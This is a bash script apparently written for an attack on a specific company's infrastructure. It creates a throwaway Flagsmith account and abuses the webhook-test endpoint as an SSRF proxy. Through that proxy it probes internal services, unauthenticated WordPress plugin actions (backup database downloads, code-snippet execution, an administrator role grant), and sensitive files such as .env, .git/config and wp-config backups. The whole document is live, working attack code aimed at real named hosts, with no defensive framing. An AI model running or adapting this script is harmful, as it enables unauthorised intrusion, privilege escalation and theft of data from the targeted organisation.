#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
IP=$(curl -s https://ifconfig.me --max-time 5)
echo "IP: $IP"

# Register fresh Flagsmith account
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"email\":\"kw-v30-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"T\",\"last_name\":\"S\"}" --max-time 15)
KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
echo "Key: $KEY"
if [ -z "$KEY" ]; then echo "REG FAILED: $ACCT"; exit 1; fi

# Setup org/project/env
OID=$(curl -s "https://flagsmith.koinworks.com/api/v1/organisations/" \
  -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10 | python3 -c "import json,sys; d=json.load(sys.stdin); r=d.get('results',[]); print(r[0]['id'] if r else '')" 2>/dev/null)
if [ -z "$OID" ]; then
  OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d '{"name":"v30"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
fi
PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"p\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"e\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
echo "Env: $EKEY"

ssrf() {
  local URL="$1"
  local LABEL="$2"
  local R=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$URL\",\"secret\":\"\"}" --max-time 30)
  echo "$LABEL -> $R"
}

echo "=== PORT 9090 DEEP PROBE ==="
ssrf "http://koinp2p.com:9090/" "9090-root"
ssrf "http://koinp2p.com:9090/health" "9090-health"
ssrf "http://koinp2p.com:9090/healthz" "9090-healthz"
ssrf "http://koinp2p.com:9090/metrics" "9090-metrics"
ssrf "http://koinp2p.com:9090/status" "9090-status"
ssrf "http://koinp2p.com:9090/api" "9090-api"
ssrf "http://koinp2p.com:9090/admin" "9090-admin"
ssrf "http://koinp2p.com:9090/graph" "9090-graph"
ssrf "http://koinp2p.com:9090/debug/pprof/" "9090-pprof"
ssrf "http://koinp2p.com:9090/server-status" "9090-srvstat"
ssrf "http://koinp2p.com:9090/targets" "9090-targets"
ssrf "http://koinp2p.com:9090/config" "9090-config"
ssrf "http://koinp2p.com:9090/-/healthy" "9090-prometheus-health"
ssrf "http://koinp2p.com:9090/api/v1/status/config" "9090-prom-config"

echo "=== WP NOPRIV AJAX DEEP ==="
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_download_backup&timestamp=1731715200&type=db" "updraft-dl-db1"
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_download_backup&timestamp=1731628800&type=db" "updraft-dl-db2"
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_download_backup&timestamp=1731542400&type=db" "updraft-dl-db3"
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_ajaxrestore&updraftplus_ajax_restore=start_ajax_restore&job_id=a&timestamp=1731715200&type=db" "updraft-restore1"
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_ajax&subaction=lastlog" "updraft-lastlog"
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_ajax&subaction=activejobs_list" "updraft-jobs"
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=updraftplus_downloadstatus&timestamp=1731715200&type=db" "updraft-dlstatus"
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_central_receive_message" "updraft-central"
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=updraftcentral_receivepublickey" "updraft-pubkey"

echo "=== CODE SNIPPETS NOPRIV ==="
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=run_code_snippet&id=1" "cs-run-1"
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=run_code_snippet&id=2" "cs-run-2"
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=save_code_snippet" "cs-save"
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=code_snippets/run" "cs-run-alt"

echo "=== USER ROLE EDITOR NOPRIV ==="
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=ure_ajax&ure_action=grant_roles&user_id=1&roles=administrator" "ure-grant"

echo "=== WP REST API WRITE ==="
ssrf "http://koinp2p.com/wp-json/wp/v2/users" "users-list"
ssrf "http://koinp2p.com/wp-json/wp/v2/settings" "settings"
ssrf "http://koinp2p.com/wp-json/wp/v2/plugins" "plugins"
ssrf "http://koinp2p.com/wp-json/wp/v2/themes" "themes"
ssrf "http://koinp2p.com/wp-json/wp-site-health/v1/tests/background-updates" "site-health"
ssrf "http://koinp2p.com/wp-json/wp/v2/block-patterns/patterns" "patterns"
ssrf "http://koinp2p.com/?rest_route=/wp/v2/users&context=edit" "users-edit"

echo "=== WP INSTALL / SENSITIVE ==="
ssrf "http://koinp2p.com/wp-admin/install.php" "install"
ssrf "http://koinp2p.com/wp-admin/setup-config.php" "setup-config"
ssrf "http://koinp2p.com/.env" "dotenv"
ssrf "http://koinp2p.com/.git/config" "git-config"
ssrf "http://koinp2p.com/phpinfo.php" "phpinfo"
ssrf "http://koinp2p.com/wp-config.php.bak" "wp-config-bak"
ssrf "http://koinp2p.com/.wp-config.php.swp" "wp-config-swp"
ssrf "http://koinp2p.com/wp-content/debug.log" "debug-log"
ssrf "http://koinp2p.com/wp-content/mysql.sql" "mysql-dump"
ssrf "http://koinp2p.com/wp-content/backups/" "backups"
ssrf "http://koinp2p.com/wp-content/updraft/" "updraft-dir"
ssrf "http://koinp2p.com/wp-content/uploads/backup-db/" "backup-db"
ssrf "http://koinp2p.com/wp-content/ai1wm-backups/" "ai1wm"
ssrf "http://koinp2p.com/wp-content/w3tc-config/" "w3tc"

echo "=== INTERNAL SERVICES ==="
ssrf "http://localhost:8000/admin/" "django-admin"
ssrf "http://localhost:8000/api/v1/users/" "flagsmith-users"
ssrf "http://localhost:8000/api/v1/organisations/1/" "flagsmith-org1"
ssrf "http://localhost:8000/health" "flagsmith-health"
ssrf "http://localhost:3000/" "frontend"
ssrf "http://localhost:5432/" "postgres"
ssrf "http://localhost:6379/" "redis"
ssrf "http://localhost:9090/" "prometheus"

echo "=== UPGRADE STAGING CHECK ==="
ssrf "http://koinp2p.com/wp-content/upgrade/" "upgrade-dir"
ssrf "http://koinp2p.com/wp-content/upgrade/wordpress-7.1.4/" "wp-7.1.4"
ssrf "http://koinp2p.com/wp-content/upgrade/wordpress-6.7.12/" "wp-6.7.12"

echo "=== DONE ==="
